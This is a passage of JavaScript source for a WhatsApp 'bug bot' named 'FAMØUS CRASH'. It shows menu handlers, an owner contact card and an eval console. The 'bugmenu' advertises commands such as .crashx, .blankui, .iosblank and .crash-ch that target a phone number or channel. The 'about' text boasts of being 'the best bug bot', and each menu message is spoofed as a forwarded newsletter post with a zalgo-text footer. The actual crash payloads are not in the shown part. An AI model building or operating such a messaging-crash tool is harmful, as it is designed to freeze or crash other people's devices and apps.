  video: { url: "https://files.catbox.moe/2m6n5o.mpeg" },
  mimetype: 'video/mp4',
  fileLength: 1,
  caption: Menu,
  gifPlayback: true,
  gifAttribution: 5,
  footer: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330289360382@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸⃟༑⌁⃰𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 - 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  }
}, { quoted: catalems });
}
break
case "bugmenu": {
let Menu = `*[ ★ ] 🦠Bugs Menu🦠*
👨‍💻 .crashx 234𝘅𝘅
🦠 .voids 234𝘅𝘅
👨‍💻 .force 234𝘅𝘅
🦠 .invisix 234𝘅𝘅
👨‍💻 .mention 234𝘅𝘅
🦠 .blankui 233𝘅𝘅
👨‍💻 .blanking 234𝘅𝘅
🦠 .iosblank 234𝘅𝘅
👨‍💻 .locios 234𝘅𝘅
🦠 .combox 𝗜𝗻𝗽𝗹𝗮𝗰𝗲
👨‍💻 .force-ch 𝗶𝗱𝗰𝗵
🦠 .crash-ch 𝗶𝗱𝗰𝗵`
sock.sendMessage(m.chat, {
  video: { url: "https://files.catbox.moe/2m6n5o.mpeg" },
  mimetype: 'video/mp4',
  fileLength: 1,
  caption: Menu,
  gifPlayback: true,
  gifAttribution: 5,
  footer: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330289360382@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸⃟༑⌁⃰𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 - 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  }
}, { quoted: catalems });
}
break
case "tqto": {
let Menu = `*[ ♢ ] Thanks To ♔*
◎ 👑𝙁𝘼𝙈Ø𝙐𝙎 𝘿𝙀𝙑👑 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿
◎ ❤️BEAMER-PIXIES❤️ 𝗠𝘆 𝗪𝗶𝗳𝗲
◎ 🐉LEGION🐉 𝗠𝘆 𝗣𝗮𝗿𝘁𝗻𝗲𝗿
◎ 👨‍💻ITACHI👨‍💻 𝗠𝘆 𝗣𝗮𝗿𝘁𝗻𝗲𝗿
◎ 👾VENOM👾 𝗠𝘆 𝗣𝗮𝗿𝘁𝗻𝗲𝗿
◎ 🗿𝙁𝘼𝙈Ø𝙐𝙎 𝘿𝙀𝙑🗿 𝗦𝗰𝗿𝗶𝗽𝘁`
sock.sendMessage(m.chat, {
  video: { url: "https://files.catbox.moe/2m6n5o.mpeg" },
  mimetype: 'video/mp4',
  fileLength: 1,
  caption: Menu,
  gifPlayback: true,
  gifAttribution: 5,
  footer: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330289360382@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸⃟༑⌁⃰𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 - 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  }
}, { quoted: catalems });
}
break
case "about": {
let Menu = `*[         ★         ] About Script :*\nI AM FAMØUS CRASH DEVELOPED BY FAMØUS DEV AND I AM THE BEST BUG BOT KNOW TO MAN,MORTAL AND IMMORTALS...
I CAN ONLY BE ACCESSED BY IMMORTALS AND NOT MORTALS

THE ONLY WAS YOU CAN SEE ME IN THE HANDS OF A MORTAL IS IF I WAS GIFTED BY MY CREATOR OR ONE STUPID BASTARD GAVE MY SCRIPT OUT FOR FREE😂`
sock.sendMessage(m.chat, {
  video: { url: "https://files.catbox.moe/2m6n5o.mpeg" },
  mimetype: 'video/mp4',
  fileLength: 1,
  caption: Menu,
  gifPlayback: true,
  gifAttribution: 5,
  footer: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330289360382@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸⃟༑⌁⃰𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 - 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  }
}, { quoted: catalems });
}
break
case "runtime": {
let Menu = `*[ ★ ] Runtime Script ♣*\n${runtime(process.uptime())} ✅`
sock.sendMessage(m.chat, {
  video: { url: "https://files.catbox.moe/2m6n5o.mpeg" },
  mimetype: 'video/mp4',
  fileLength: 1,
  caption: Menu,
  gifPlayback: true,
  gifAttribution: 5,
  footer: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330289360382@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸⃟༑⌁⃰𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 - 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  }
}, { quoted: catalems });
}
break
case "script": {
let Menu = `*[ ★ ] Information Script ♣*
https://whatsapp.com/channel/0029VbAaOJLInlqVwhwtxS33`
sock.sendMessage(m.chat, {
  video: { url: "https://files.catbox.moe/2m6n5o.mpeg" },
  mimetype: 'video/mp4',
  fileLength: 1,
  caption: Menu,
  gifPlayback: true,
  gifAttribution: 5,
  footer: `�̸̡̭͚̭͚̭͎̼̰̍́̃͆͝�̵͉̀͐̈͒͛̈́͘F̵̨̠̪̱̭̘̘̖̭͠Ḁ̷̧̞̯̘̮̙̙̖̿̏̊̾͠ͅM̵̨̭͚͉̝͚̘̜̘͓͂͂̇̈́̃̒̀̽̚͝Ø̵̢̡̻̝̩̤͈̮͚̟͐̅̈́͝Ú̴̧̮̮̣̘̩̖̅̕͝Ṡ̶͕̪͌̔̐ ̶̨̛̯̼̞͖̣̲̽̐͂̓̾͘͝Ç̸̹̭̭̠̩̊̊̍̄̚͘͜R̸̢̞͉͙͙̪̘͊͛̌̽̂͘Ȃ̴̦͖̞̄̓̿̽̌͂͗́S̵̱̣̘͋̐͐̎̍̏̕͝͝H̴̦̯̗̲͚̯͆̈́̎͊̀̚̚͠͠�̸̧̞͇͉̩͛̑̌̑͆͝�̸̗̠̱̤̱͎͎̓ͅ`,
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363330289360382@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸⃟༑⌁⃰𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 - 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  }
}, { quoted: catalems });
}
break
case "owner": {
  let namaown = `𝙁𝘼𝙈Ø𝙐𝙎 𝘿𝙀𝙑 ϟ`
  let NoOwn = `2348126003566`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:Author : DilxzВаэлтрикс͢ ϟ\nX-WA-BIZ-NAME:[[ ༑ ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: catalems
  })
  sock.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break

default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await dilxzreply(evaled);
} catch (err) {
dilxzreply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await dilxzreply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})